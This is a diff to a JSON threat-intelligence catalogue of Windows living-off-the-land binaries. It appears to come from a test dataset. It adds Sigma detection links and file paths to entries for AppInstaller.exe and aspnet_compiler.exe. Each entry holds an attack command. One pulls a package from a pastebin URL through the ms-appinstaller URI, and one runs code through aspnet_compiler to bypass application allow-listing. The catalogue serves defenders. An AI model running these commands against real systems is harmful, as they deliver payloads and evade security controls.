@@ -2,21 +2,30 @@
   {
     "type": "Tool",
     "value": "AppInstaller.exe",
-    "description": "Tool used for installation of AppX/MSIX applications on Windows 10",
     "fields": {
       "Commands": [
         {
-          "Command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
-          "Description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
-          "Usecase": "Download file from Internet",
-          "Category": "Download",
-          "Privileges": "User",
-          "MitreID": "T1105",
-          "OperatingSystem": "Windows 10, Windows 11"
+          "command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw",
+          "description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>",
+          "usecase": "Download file from Internet",
+          "category": "Download",
+          "privileges": "User",
+          "mitreid": "T1105",
+          "operatingsystem": "Windows 10, Windows 11"
         }
       ],
-      "Detections": [],
-      "Paths": [],
+      "Detections": [
+        {
+          "type": "Sigma",
+          "content": "https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml"
+        }
+      ],
+      "Paths": [
+        {
+          "path": "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe"
+        }
+      ],
+      "description": "Tool used for installation of AppX/MSIX applications on Windows 10",
       "trafficlightprotocol": "TEST",
       "tags": [
         "tag1",
@@ -60,21 +69,37 @@
   {
     "type": "Tool",
     "value": "Aspnet_Compiler.exe",
-    "description": "ASP.NET Compilation Tool",
     "fields": {
       "Commands": [
         {
-          "Command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
-          "Description": "Execute C# code with the Build Provider and proper folder structure in place.",
-          "Usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions",
-          "Category": "AWL Bypass",
-          "Privileges": "User",
-          "MitreID": "T1127",
-          "OperatingSystem": "Windows 10, Windows 11"
+          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
+          "description": "Execute C# code with the Build Provider and proper folder structure in place.",
+          "usecase": "Execute proxied payload with Microsoft signed binary to bypass application control solutions",
+          "category": "AWL Bypass",
+          "privileges": "User",
+          "mitreid": "T1127",
+          "operatingsystem": "Windows 10, Windows 11"
         }
       ],
-      "Detections": [],
-      "Paths": [],
+      "Detections": [
+        {
+          "type": "BlockRule",
+          "content": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+        },
+        {
+          "type": "Sigma",
+          "content": "https://github.com/SigmaHQ/sigma/blob/960a03eaf480926ed8db464477335a713e9e6630/rules/windows/process_creation/win_pc_lobas_aspnet_compiler.yml"
+        }
+      ],
+      "Paths": [
+        {
+          "path": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"
+        },
+        {
+          "path": "c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe"
+        }
+      ],
+      "description": "ASP.NET Compilation Tool",
       "trafficlightprotocol": "TEST",
       "tags": [
         "tag1",
